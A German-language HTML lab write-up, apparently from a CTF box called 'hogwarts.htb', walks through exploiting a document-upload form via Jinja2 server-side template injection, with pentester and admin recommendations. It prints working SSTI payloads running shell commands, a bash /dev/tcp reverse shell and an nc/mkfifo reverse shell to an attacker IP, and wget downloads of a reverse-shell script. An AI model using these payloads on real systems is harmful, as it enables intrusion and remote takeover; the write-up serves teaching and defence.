+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Wichtige Schwachstellen identifiziert!** Auch wenn der Scan gegen eine potenziell falsche IP lief, sind die Ergebnisse (insbesondere wenn sie auch auf 192.168.2.175 zutreffen) sehr relevant:
+                 <ul>
+                     <li>**SSH:** Die gemeldeten Schwachstellen für OpenSSH 8.2p1, insbesondere CVE-2023-38408 und die verlinkten Exploits, stellen ein hohes Risiko dar und könnten einen direkten Zugriff ermöglichen, falls ausnutzbar.</li>
+                     <li>**HTTP:** Die Anfälligkeit für Slowloris DoS (CVE-2007-6750) ist ein Problem der Verfügbarkeit. Ein Angreifer könnte den Webserver potenziell lahmlegen.</li>
+                 </ul>
+             </p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die SSH-Schwachstellen (insbesondere CVE-2023-38408) für OpenSSH 8.2p1 auf dem korrekten Ziel (`192.168.2.175`). Recherchieren und testen Sie die verfügbaren Exploits. Die Slowloris-Anfälligkeit kann für einen DoS-Angriff genutzt werden, was aber normalerweise nicht das primäre Ziel eines Penetrationstests ist, es sei denn, die Auswirkungen auf die Verfügbarkeit sollen demonstriert werden.<br><strong>Empfehlung (Admin):</strong> **Aktualisieren Sie OpenSSH dringend** auf eine Version, die gegen CVE-2023-38408 und andere bekannte Schwachstellen gepatcht ist. Konfigurieren Sie den Webserver (Werkzeug/Apache/Nginx), um Slowloris-Angriffe zu mitigieren (z.B. durch Begrenzung der Verbindungen pro IP, Timeout-Anpassungen, Verwendung von Modulen wie `mod_reqtimeout` für Apache).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+view-source:http://hogwarts.htb/
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Pentester beabsichtigt, den Quelltext der Hauptseite von `http://hogwarts.htb` anzusehen. Der Inhalt wird im nächsten Block gezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Untersuchen des HTML-Quellcodes ist ein grundlegender Schritt bei der Web-Enumeration, um versteckte Felder, Kommentare, Skript-Pfade oder Hinweise auf verwendete Technologien zu finden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode sorgfältig auf interessante Informationen, insbesondere auf Formulare, JavaScript-Dateien und Kommentare.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, sensible Informationen (wie Kommentare mit Zugangsdaten, interne Pfade etc.) im HTML-Quellcode zu hinterlassen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+            &lt;!-- Add more professors as needed in the same format --&gt;
+
+            &lt;h3&gt;What You Will Learn at Hogwarts&lt;/h3&gt;
+            &lt;ul&gt;
+                &lt;li&gt;Transfiguration: The art of changing the form or appearance of an object or being.&lt;/li&gt;
+                &lt;li&gt;Charms: The casting of spells that add specific properties to objects and creatures.&lt;/li&gt;
+                &lt;li&gt;Potions: The study of magical brews that can have a variety of effects, from healing to transformation.&lt;/li&gt;
+                &lt;li&gt;Herbology: The study of magical plants and fungi.&lt;/li&gt;
+                &lt;li&gt;Defense Against the Dark Arts: Learning to protect oneself from dark creatures, curses, and spells.&lt;/li&gt;
+                &lt;li&gt;Astronomy: The study of the stars, planets, and their magical influences.&lt;/li&gt;
+                &lt;li&gt;History of Magic: A look at the history of the magical world, from the earliest wizards to modern-day events.&lt;/li&gt;
+                &lt;li&gt;Divination: The mystical art of predicting the future.&lt;/li&gt;
+                &lt;li&gt;Care of Magical Creatures: Learning about the care, handling, and feeding of magical creatures.&lt;/li&gt;
+            &lt;/ul&gt;
+
+ Apply to Hogwarts 
+hier ist ein upload Formular
+     <span class="command">action="/upload" method="POST" enctype="multipart/form-data"</span> 
+                &lt;label for="pdf_file"&gt;Submit your application in PDF format:&lt;br&gt;&lt;br&gt; 
+   <span class="command">href="/static/application-template.docx" download</span>&gt;Please, use our template &lt;/label&gt;&lt;br&gt;&lt;br&gt;
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist ein relevanter Auszug aus dem HTML-Quellcode von `http://hogwarts.htb/`.
+                 <ul>
+                     <li>Es gibt ein Formular ("Apply to Hogwarts"), das Daten an den Endpunkt `/upload` mittels der `POST`-Methode sendet.</li>
+                     <li>Das Attribut `enctype="multipart/form-data"` ist entscheidend, da es anzeigt, dass dieses Formular für Datei-Uploads vorgesehen ist.</li>
+                     <li>Ein Label fordert zur Einreichung der Bewerbung im PDF-Format auf.</li>
+                     <li>Ein Link (`href="/static/application-template.docx" download`) bietet eine Vorlage im DOCX-Format (Microsoft Word) zum Download an.</li>
+                 </ul>
+                 Der Kommentar "hier ist ein upload Formular" stammt vom Pentester.
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Existenz einer Datei-Upload-Funktionalität unter `/upload`. Die Diskrepanz zwischen der Aufforderung (PDF) und der bereitgestellten Vorlage (DOCX) ist interessant, könnte aber einfach ein Fehler sein. Entscheidend ist, dass es eine Upload-Möglichkeit gibt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das Upload-Formular genauer. Welche Felder gibt es? Gibt es clientseitige Validierungen (die oft umgangen werden können)? Versuchen Sie, verschiedene Dateitypen hochzuladen (nicht nur PDF oder DOCX), insbesondere Skriptdateien (PHP, Python, Shell), um zu sehen, ob der Server diese akzeptiert und ob sie ausgeführt werden können. Analysieren Sie die Serverantwort nach dem Upload.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie serverseitig eine strikte Whitelist-Validierung für erlaubte Dateitypen und -inhalte bei Uploads. Speichern Sie hochgeladene Dateien sicher (außerhalb des Web-Roots oder ohne Ausführungsrechte) und benennen Sie sie um. Scannen Sie Uploads auf Malware.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+------------------------------------------------------------------------- 
+Apply to Hogwarts
+Submit your application in PDF format:
+
+Please, use our template
+
+[Durchsuchen]
+ 
+------------------------------------------------------------------------- 
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies scheint eine textuelle Darstellung des Upload-Formulars zu sein, wie es im Browser angezeigt wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Vorhandensein des Formulars und des Upload-Buttons ("Durchsuchen").</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Interagieren Sie mit dem Formular, laden Sie Testdateien hoch und analysieren Sie die Anfragen/Antworten mit einem Proxy wie Burp Suite.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur Absicherung von Uploads.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+[Link: https://xodo.com/docx-word-editor?step=edit-docx#app | Ziel: https://xodo.com/docx-word-editor?step=edit-docx#app]
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Link zu einem Online-DOCX-Editor (xodo.com).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist wahrscheinlich eine Notiz des Pentesters, wie er die heruntergeladene DOCX-Vorlage bearbeiten kann. Es ist für den technischen Ablauf des Angriffs nicht direkt relevant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine spezifische Aktion erforderlich. Bearbeiten Sie die Vorlage mit einem geeigneten Tool.<br><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Application Letter to Hogwarts School of Witchcraft and Wizardry
+Dear Headmaster or Headmistress,
+
+I am writing to express my strong interest in applying for admission to Hogwarts School of Witchcraft and Wizardry. From a very young age, I have been fascinated by the magical world, and I believe that Hogwarts is the ideal place for me to develop my skills and knowledge in magic. I am eager to learn and grow under the guidance of the esteemed professors at your prestigious institution.
+
+Throughout my life, I have demonstrated qualities such as curiosity, perseverance, and a deep desire to learn. I am particularly interested in subjects such as Charms, Potions, and Defense Against the Dark Arts, and I am confident that Hogwarts will provide me with the perfect environment to explore these interests.
+
+I am excited about the opportunity to become a part of the rich tradition and community at Hogwarts, and I hope that my application will be considered for the upcoming academic year. I have enclosed all required documents and would be grateful for your consideration.
+
+Thank you for your time and consideration. I look forward to the possibility of joining Hogwarts and contributing to its legacy of excellence.
+
+Yours sincerely,
+
+<span class="command">Name: [Your Name]</span>
+<span class="command">Surname: [Your Surname]</span>
+<span class="command">Address: [Your Address]</span>
+<span class="command">Birthday: [Your Birthday]</span>
+<span class="command">Pet breed: [Your Pets Breed]</span>
+<span class="command">Pet’s Name: [Your Pets Name]</span>
+------------------------------------------------------------------------- 
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist der Inhalt der heruntergeladenen DOCX-Vorlage (`application-template.docx`). Es ist ein Bewerbungsschreiben an Hogwarts mit Platzhaltern für persönliche Daten am Ende.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Vorlage selbst scheint harmlos. Interessant sind die Felder am Ende, die ausgefüllt werden müssen. Es ist möglich, dass die Anwendung diese Felder beim Verarbeiten des hochgeladenen Dokuments (auch wenn PDF gefordert war, wird vielleicht DOCX verarbeitet) ausliest und weiterverarbeitet. Solche Felder könnten potenzielle Injektionspunkte sein (z.B. für Cross-Site Scripting (XSS), Server-Side Template Injection (SSTI), oder sogar OS Command Injection, wenn die Daten unsicher verarbeitet werden).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Füllen Sie die Felder in der Vorlage nicht nur mit normalen Daten, sondern auch mit Test-Payloads für verschiedene Schwachstellen (z.B. `&lt;script&gt;alert(1)&lt;/script&gt;` für XSS, `{{ 7*7 }}` für SSTI, `| ls` oder `; ls` für Command Injection). Speichern Sie die Datei (ggf. als PDF, wenn das Format serverseitig doch geprüft wird) und laden Sie sie über das Formular hoch. Beobachten Sie die Antwort und das Verhalten der Anwendung.<br><strong>Empfehlung (Admin):</strong> Wenn Daten aus hochgeladenen Dokumenten (DOCX, PDF etc.) extrahiert und verarbeitet werden, müssen diese Daten genauso streng validiert und sanitisiert werden wie jede andere Benutzereingabe. Verwenden Sie sichere Bibliotheken zur Verarbeitung von Dokumenten und vermeiden Sie unsichere Funktionen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+  SSTI Python Attack  
+
+ssti github
+[Link: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection | Ziel: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Notiz des Pentesters, die auf Server-Side Template Injection (SSTI) als potenziellen Angriffsvektor hinweist, insbesondere im Kontext von Python (da der Server Werkzeug/Python verwendet). Ein Link zu einer bekannten Payload-Sammlung auf GitHub wird angegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> SSTI ist eine kritische Schwachstelle, die oft zu Remote Code Execution führt. Wenn die Anwendung Benutzereingaben (wie die Felder aus dem DOCX-Template) in eine Template-Engine (wie Jinja2, die oft mit Flask/Werkzeug verwendet wird) einfügt, ohne sie korrekt zu escapen, kann ein Angreifer versuchen, Code innerhalb der Template-Syntax auszuführen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie die Felder im Upload-Dokument gezielt auf SSTI, wie im nächsten Block gezeigt.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Benutzereingaben, die in Templates gerendert werden, ordnungsgemäß kontextabhängig escaped werden. Verwenden Sie sichere Standardeinstellungen der Template-Engine und vermeiden Sie unsichere Konstrukte.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("chmod 777 ben.txt;mv ben.txt ben.sh; ls -la").read() }}]</span>
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+------------------------------------------------------------------------- 
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies zeigt einen konkreten SSTI-Payload, der in das "Name"-Feld der DOCX-Vorlage eingefügt wurde. Der Payload verwendet Jinja2-Syntax (`{{ ... }}`) und Python-Interna, um Betriebssystembefehle auszuführen:
+                 <ul>
+                     <li><code>self.__init__.__globals__</code>: Greift auf globale Variablen zu.</li>
+                     <li><code>__builtins__.__import__("os")</code>: Importiert das `os`-Modul.</li>
+                     <li><code>popen("...").read()</code>: Führt einen Shell-Befehl aus und liest dessen Ausgabe.</li>
+                     <li>Der Shell-Befehl: `chmod 777 ben.txt;mv ben.txt ben.sh; ls -la` versucht, eine (vermutlich zuvor hochgeladene?) Datei `ben.txt` umzubenennen und die Dateiliste anzuzeigen.</li>
+                 </ul>
+                 Der Wert für "Pet's Name" ist auf "ben" gesetzt, was möglicherweise mit der Datei `ben.txt` zusammenhängt.
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein gezielter Versuch, eine SSTI-Schwachstelle auszunutzen, um Betriebssystembefehle auszuführen. Die Fähigkeit, das `os`-Modul zu importieren und `popen` aufzurufen, würde eine kritische Schwachstelle bestätigen und Remote Code Execution (RCE) ermöglichen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie das modifizierte Dokument hoch und analysieren Sie die Antwort der Anwendung. Wenn der `ls -la`-Befehl erfolgreich ausgeführt wird und seine Ausgabe im gerenderten Ergebnis (z.B. auf einer Bestätigungsseite) erscheint, ist die SSTI-Schwachstelle bestätigt und RCE möglich.<br><strong>Empfehlung (Admin):</strong> **Dringend beheben!** Validieren und escapen Sie alle Benutzereingaben, die in Templates verwendet werden. Aktualisieren Sie die Template-Engine und das Web-Framework auf die neuesten Versionen. Führen Sie einen Code-Audit durch, um alle Vorkommen von unsicherer Template-Verarbeitung zu finden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ Name: [total 32
+drwxr-xr-x 5 harry_potter harry_potter 4096 Feb 12 23:47 .
+drwxr-xr-x 3 harry_potter harry_potter 4096 Feb  4 10:04 ..
+-rw-r--r-- 1 harry_potter harry_potter 5875 Sep 26 18:42 app.py
+-rw-r--r-- 1 harry_potter harry_potter   61 Feb 12 23:45 <span class="command">ben.sh</span>
+drwxr-xr-x 3 harry_potter harry_potter 4096 Sep 25 13:58 static
+drwxr-xr-x 2 harry_potter harry_potter 4096 Sep 27 08:56 templates
+drwxr-xr-x 2 harry_potter harry_potter 4096 Feb 12 23:47 uploads
+ 
+------------------------------------------------------------------------- 
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist die (vermutete) Ausgabe, die von der Webanwendung zurückgegeben wurde, nachdem das Dokument mit dem vorherigen SSTI-Payload im "Name"-Feld hochgeladen wurde. Die Ausgabe entspricht dem Ergebnis des `ls -la`-Befehls, der als Teil des Payloads ausgeführt wurde. Sie zeigt den Inhalt des Arbeitsverzeichnisses der Webanwendung, das dem Benutzer `harry_potter` gehört. Eine Datei `ben.sh` ist sichtbar.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Fantastisch! Die SSTI-Schwachstelle ist bestätigt und ermöglicht Remote Code Execution!** Der Angreifer kann nun beliebige Befehle im Kontext des Benutzers ausführen, unter dem die Webanwendung läuft (hier `harry_potter`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die SSTI, um eine stabilere Zugriffsmethode zu etablieren, z.B. eine Reverse Shell. Modifizieren Sie den Payload, um einen Befehl auszuführen, der eine Verbindung zu Ihrem Listener aufbaut.<br><strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Beheben Sie die SSTI-Schwachstelle sofort durch korrektes Escaping von Benutzereingaben in Templates. Aktualisieren Sie alle Bibliotheken. Da RCE möglich war, betrachten Sie den Server als potenziell kompromittiert und führen Sie eine Untersuchung durch.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cp ben.sh /tmp/ben.sh; chmod +x /tmp/ben.sh;ls -la /tmp").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein neuer SSTI-Payload im "Name"-Feld. Dieser Payload kopiert die Datei `ben.sh` (die im vorherigen Schritt im Arbeitsverzeichnis der App gesehen wurde) nach `/tmp/ben.sh`, macht sie ausführbar (`chmod +x`) und listet dann den Inhalt von `/tmp` auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Pentester versucht, das Skript `ben.sh` in ein allgemein zugängliches und beschreibbares Verzeichnis (`/tmp`) zu kopieren, um es von dort aus leichter ausführen zu können.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die zurückgegebene Ausgabe, um zu sehen, ob der Kopiervorgang erfolgreich war und welche anderen Dateien sich in `/tmp` befinden.<br><strong>Empfehlung (Admin):</strong> Die Empfehlungen zur Behebung der SSTI bleiben bestehen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+                            &lt;li&gt;Name: [total 56
+drwxrwxrwt 13 root         root         4096 Feb 12 23:49 .
+drwxr-xr-x 19 root         root         4096 Sep 25 06:57 ..
+-rwxr-xr-x  1 harry_potter harry_potter   61 Feb 12 23:50 <span class="command">ben.sh</span>
+drwxrwxrwt  2 root         root         4096 Feb 12 20:04 .font-unix
+drwxrwxrwt  2 root         root         4096 Feb 12 20:04 .ICE-unix
+drwx------  3 root         root         4096 Feb 12 20:04 snap-private-tmp
+drwx------  3 root         root         4096 Feb 12 20:04 systemd-private-f3cd7e53f972452cbf20cfdb8ca3b373-ModemManager.service-lLtKuj
+drwx------  3 root         root         4096 Feb 12 20:04 systemd-private-f3cd7e53f972452cbf20cfdb8ca3b373-systemd-logind.service-DhJj8h
+drwx------  3 root         root         4096 Feb 12 20:04 systemd-private-f3cd7e53f972452cbf20cfdb8ca3b373-systemd-resolved.service-h9Iagg
+drwx------  3 root         root         4096 Feb 12 20:04 systemd-private-f3cd7e53f972452cbf20cfdb8ca3b373-systemd-timesyncd.service-gvnkig
+drwx------  3 root         root         4096 Feb 12 20:13 systemd-private-f3cd7e53f972452cbf20cfdb8ca3b373-upower.service-HSVokj
+drwxrwxrwt  2 root         root         4096 Feb 12 20:04 .Test-unix
+drwxrwxrwt  2 root         root         4096 Feb 12 20:04 .X11-unix
+drwxrwxrwt  2 root         root         4096 Feb 12 20:04 .XIM-unix
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Ausgabe des vorherigen SSTI-Payloads wird angezeigt. Sie enthält die Auflistung des `/tmp`-Verzeichnisses. Man sieht, dass die Datei `ben.sh` erfolgreich nach `/tmp` kopiert wurde und Ausführungsrechte besitzt (`-rwxr-xr-x`). Das Verzeichnis enthält auch verschiedene System- und Socket-Dateien.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Kopiervorgang war erfolgreich. Das Skript `ben.sh` ist nun in `/tmp` und bereit zur Ausführung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie das Skript `/tmp/ben.sh` über einen weiteren SSTI-Payload aus, um zu sehen, was es tut. Es ist wahrscheinlich eine Reverse Shell oder ein anderer bösartiger Payload.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie das `/tmp`-Verzeichnis auf verdächtige ausführbare Dateien. Beschränken Sie nach Möglichkeit die Ausführung von Skripten aus `/tmp` (z.B. durch Mount-Optionen wie `noexec`, obwohl dies oft umgangen werden kann).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("./tmp/ben.sh").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser SSTI-Payload versucht, das Skript `/tmp/ben.sh` auszuführen. Da der Pfad mit `./tmp/ben.sh` angegeben ist und der aktuelle Pfad der Anwendung wahrscheinlich `/home/harry_potter/Hogwarts_web/` ist, wird dies fehlschlagen. Der korrekte Pfad wäre `/tmp/ben.sh`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Payload ist syntaktisch korrekt für SSTI, aber der Pfad zum Skript ist falsch angegeben. Dieser Versuch wird wahrscheinlich nicht funktionieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrigieren Sie den Pfad im Payload zu `/tmp/ben.sh`.<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cat /tmp/ben.sh").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Payload verwendet SSTI, um den Inhalt des Skripts `/tmp/ben.sh` auszulesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine gute Methode, um den Inhalt des Skripts zu überprüfen, bevor es ausgeführt wird, oder wenn die direkte Ausführung fehlschlägt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die Ausgabe (im nächsten Block), um zu verstehen, was das Skript tut.<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ Name: [<span class="command">!#/bin/bash</span>
+<span class="command">/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist die Ausgabe des `cat /tmp/ben.sh`-Befehls aus dem vorherigen SSTI-Payload. Das Skript `/tmp/ben.sh` enthält einen Shebang (`#!/bin/bash`) und einen Befehl zum Aufbau einer interaktiven Bash-Reverse-Shell zum Angreifer-Host `192.168.2.199` auf Port `4444`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Skript ist eindeutig eine Reverse Shell. Es ist nun klar, was bei der Ausführung von `/tmp/ben.sh` passieren wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Port 4444 (`nc -lvnp 4444`) und führen Sie dann das Skript `/tmp/ben.sh` über einen korrigierten SSTI-Payload aus (z.B. `{{ ...popen("/tmp/ben.sh").read() }}`).<br><strong>Empfehlung (Admin):</strong> SSTI beheben. Entfernen Sie das bösartige Skript `/tmp/ben.sh`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("cd /tmp;pwd;./tmp/ben.sh").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer Versuch, `/tmp/ben.sh` auszuführen. Der Payload wechselt zuerst nach `/tmp` (`cd /tmp`), gibt das aktuelle Verzeichnis aus (`pwd`) und versucht dann `./tmp/ben.sh` auszuführen. Der letzte Teil ist immer noch falsch, da `./tmp/ben.sh` von `/tmp` aus nicht existiert. Es sollte `./ben.sh` oder `/tmp/ben.sh` heißen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Payload wird ebenfalls fehlschlagen, die Shell auszuführen, aber die Ausgabe von `pwd` wird möglicherweise zurückgegeben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrigieren Sie den Ausführungsbefehl zu `./ben.sh` oder `/tmp/ben.sh` innerhalb des `popen()`-Aufrufs.<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Application Received
+
+Thank you. Your application to Hogwarts has been successfully submitted with the following data:
+
+    Name: [<span class="command">/tmp</span> ]
+    Surname: [Your Surname]
+    Address: [Your Address]
+    Birthday: [Your Birthday]
+    Pet Breed: [Your Pets Breed]
+    Pet's Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dies ist die Antwortseite der Anwendung nach dem Hochladen des Dokuments mit dem vorherigen (fehlerhaften) Payload. Wie erwartet, wurde nur die Ausgabe von `pwd` (`/tmp`) im "Name"-Feld reflektiert. Die Shell wurde nicht ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der vorherige Payload die Shell nicht gestartet hat, aber die Codeausführung an sich funktioniert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrigieren Sie den Payload zur Ausführung von `/tmp/ben.sh`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.2.199 4444 &gt;/tmp/f' > /tmp/ben.sh; cd /tmp; ./tmp/ben.sh").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser SSTI-Payload versucht, mehrere Dinge auf einmal zu tun:
+                 <ol>
+                    <li>Überschreibt `/tmp/ben.sh` mit einem neuen Inhalt: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 192.168.2.199 4444 >/tmp/f`. Dies ist die robustere Reverse-Shell-Variante mit Named Pipes.</li>
+                    <li>Wechselt nach `/tmp`.</li>
+                    <li>Versucht, `./tmp/ben.sh` auszuführen (immer noch der falsche relative Pfad von `/tmp` aus).</li>
+                 </ol>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Versuch, das Skript mit einer neuen Payload zu überschreiben, ist sinnvoll, aber die Ausführung wird aufgrund des Pfadfehlers wahrscheinlich wieder fehlschlagen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Teilen Sie die Aktionen auf: 1. Payload zum Schreiben des korrekten Skriptinhalts nach `/tmp/ben.sh`. 2. Payload zur Ausführung von `/tmp/ben.sh` (mit korrektem Pfad).<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("wget 192.168.2.199/rever.sh").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein neuer Ansatz: Dieser SSTI-Payload versucht, ein Skript namens `rever.sh` vom HTTP-Server des Angreifers (auf Port 80, da kein Port angegeben ist) herunterzuladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine alternative Methode, um einen Reverse-Shell-Payload auf das Zielsystem zu bekommen, anstatt ihn direkt in das Skript zu schreiben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der HTTP-Server auf dem Angreifer-System läuft und die Datei `rever.sh` (mit einem Reverse-Shell-Payload) bereitstellt. Überprüfen Sie die Antwort, ob der Download erfolgreich war (die Ausgabe von `wget` wird ggf. zurückgegeben).<br><strong>Empfehlung (Admin):</strong> SSTI beheben. Egress-Filtering kann Downloads von externen/internen Quellen blockieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Name: [{{ self.__init__.__globals__.__builtins__.__import__("os").popen("which wget; cd /tmp;wget 192.168.2.199/rever.sh").read() }}]
+Surname: [Your Surname]
+Address: [Your Address]
+Birthday: [Your Birthday]
+Pet breed: [Your Pets Breed]
+Pet’s Name: [ben]
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Payload verfeinert den vorherigen:
+                 <ol>
+                    <li>`which wget`: Überprüft, ob `wget` verfügbar ist und gibt den Pfad zurück.</li>
+                    <li>`cd /tmp`: Wechselt nach `/tmp`.</li>
+                    <li>`wget 192.168.2.199/rever.sh`: Lädt das Skript herunter.</li>
+                 </ol>
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Payload ist besser, da er zuerst die Verfügbarkeit von `wget` prüft und sicherstellt, dass der Download in `/tmp` stattfindet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die Antwort, um den Pfad von `wget` zu sehen und den Erfolg des Downloads zu bestätigen.<br><strong>Empfehlung (Admin):</strong> SSTI beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+####
+
+Application Received
+
+Thank you. Your application to Hogwarts has been successfully submitted with the following data:
+
+    Name: [<span class="command">/usr/bin/wget</span> ]
+    Surname: [Your Surname]
+    Address: [Your Address]
+    Birthday: [Your Birthday]
+    Pet Breed: [Your Pets Breed]
+    Pet's Name: [ben]
+                     </pre>
+                 </div>
+             </div>
